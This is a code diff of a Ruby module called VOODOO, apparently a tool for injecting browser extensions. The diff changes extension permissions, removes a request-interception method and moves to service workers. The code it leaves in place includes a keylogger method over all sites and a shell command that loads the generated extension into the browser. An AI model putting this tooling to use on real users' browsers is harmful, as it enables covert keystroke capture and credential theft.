@@ -14,8 +14,9 @@ module VOODOO
             @process_name = process_name
             @collector_threads = []
 
-            @extension.manifest[:permissions] = ['tabs', '*://*/*', 'webRequest']
-            @extension.add_background_script(file: File.join(__dir__, 'js/collector.js'))
+            @extension.manifest[:permissions] = ['tabs', 'storage']
+            matches = '*://*/*'
+            #@extension.add_content_script(matches, js: [File.join(__dir__, 'js/collector.js')])
         end
 
         def keylogger(matches: '*://*/*', max_events: nil)
@@ -25,28 +26,16 @@ module VOODOO
             ) do |event|
                 yield event
             end
-        end
-
-        def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil, max_events: nil)
-            options = {
-                matches: matches,
-                url_include: url_include,
-                body_include: body_include,
-                header_exists: header_exists
-            }
-
-            add_script(options: options,
-                       background: true,
-                       max_events: max_events,
-                       file: File.join(__dir__, 'js/intercept.js')
-            ) do |event|
-                yield event
-            end
-        end
+        end         
 
         def add_permissions(permissions)
             permissions = [permissions] unless permissions.is_a? Array
             @extension.manifest[:permissions] += permissions
+        end
+
+        def add_host_permissions(hosts)
+            hosts = [hosts] unless hosts.is_a? Array
+            @extension.manifest[:host_permissions] += hosts
         end
 
         def close_browser
@@ -61,7 +50,7 @@ module VOODOO
 
             urls = [urls] unless urls.kind_of? Array
             urls = urls.uniq
-
+            
             `open -b "#{@bundle}" --args #{flags} --load-extension="#{@extension.save}" #{urls.shift}`
 
             if urls.length > 0
@@ -153,12 +142,11 @@ module VOODOO
             content = content % options
             
             if background == true
-                return @extension.add_background_script(content: content)
+                return @extension.add_service_worker(content: content)
             else
                 if matches == nil
                     matches = '*://*/*'
                 end
-                
                 return @extension.add_content_script(matches, js: [content])
             end
         end
